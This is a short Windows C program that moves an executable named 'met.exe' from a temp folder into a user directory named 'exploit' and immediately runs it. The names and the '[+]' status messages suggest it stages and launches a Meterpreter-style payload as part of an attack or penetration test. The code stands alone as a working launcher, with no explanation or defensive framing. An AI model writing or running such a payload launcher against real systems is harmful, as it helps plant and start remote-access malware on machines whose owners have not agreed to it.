#include <windows.h>
#include <stdio.h>

int main() {
    const char *sourceFile = "C:\\Temp\\met.exe";  // Source file path
    const char *destFile = "C:\\Users\\exploit\\met.exe";  // Destination file path

    // Move the file
    if (MoveFileA(sourceFile, destFile)) {
        printf("[+] File moved successfully: %s -> %s\n", sourceFile, destFile);
    } else {
        printf("[-] MoveFileA failed. Error: %lu\n", GetLastError());
        return 1;
    }

    // Setup for CreateProcessA
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Execute the moved file
    if (CreateProcessA(destFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[+] Process created successfully! PID: %lu\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcessA failed. Error: %lu\n", GetLastError());
        return 1;
    }

    return 0;
}

